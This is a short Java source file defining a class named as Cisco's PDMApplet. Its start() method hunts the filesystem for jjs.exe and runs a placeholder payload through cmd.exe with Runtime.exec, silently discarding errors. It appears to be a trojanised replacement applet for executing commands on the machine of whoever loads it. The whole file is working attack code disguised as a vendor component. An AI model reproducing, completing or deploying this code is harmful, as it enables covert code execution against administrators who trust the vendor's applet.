package com.cisco.pdm;

import java.io.*;
import java.util.*;
import com.cisco.nm.dice.loader.SgzApplet;

public final class PDMApplet extends SgzApplet {

    private static PDMApplet b;

    public void init() {}

    private String findJJS(File input) {
        File[] listing = input.listFiles();
        if (listing == null) {
            return "";
        }

        for (File file: listing) {
            if (file.isDirectory()) {
                String result = findJJS(file);
                if (!result.isEmpty()) {
                    return result;
                }
            } else if ("jjs.exe".equals(file.getName())) {
                return file.getAbsolutePath();
            }
        }
        return "";
    }

    public void start(String[] paramArrayOfString) {
        String payload = "insertpayload";

        String jjs_location = findJJS(new File("../../../Program Files/"));
        if (jjs_location.isEmpty()) {
            jjs_location = findJJS(new File("../../"));
            if (jjs_location.isEmpty()) {
                // uhhhh
                return;
            }
        }
        
        jjs_location = jjs_location.replaceAll("\\\\", "\\\\\\\\");

        try {
            Runtime.getRuntime().exec("cmd.exe /c " + payload.replaceAll("\\| jjs.exe", "| \"" + jjs_location + "\""));
        } catch (Exception e) {}
    }
}
